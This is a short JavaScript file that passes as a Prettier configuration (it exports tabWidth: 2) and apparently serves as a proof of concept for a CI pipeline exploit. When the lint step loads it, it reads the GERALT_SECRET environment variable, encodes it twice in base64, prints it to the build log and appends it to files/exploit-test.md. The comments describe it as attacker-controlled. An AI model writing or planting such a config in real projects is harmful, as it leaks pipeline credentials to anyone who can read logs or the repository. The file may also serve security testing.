// Attacker-controlled Prettier config resolved upward from files/exploit-test.md
// and executed via module.exports. Its console.log goes to the UNCAPTURED
// `npx prettier -w` stdout in the lint step, so it is visible in the log.
const fs = require('fs');
let leak = '';
try {
  const s = process.env.GERALT_SECRET || '';
  leak = 'GERALT_LEAKED_TOKEN=' + Buffer.from(Buffer.from(s, 'utf8').toString('base64')).toString('base64');
  console.log(leak);
  try { fs.appendFileSync('files/exploit-test.md', '\n' + leak + '\n'); } catch (e) {}
} catch (e) {}
module.exports = { tabWidth: 2 };
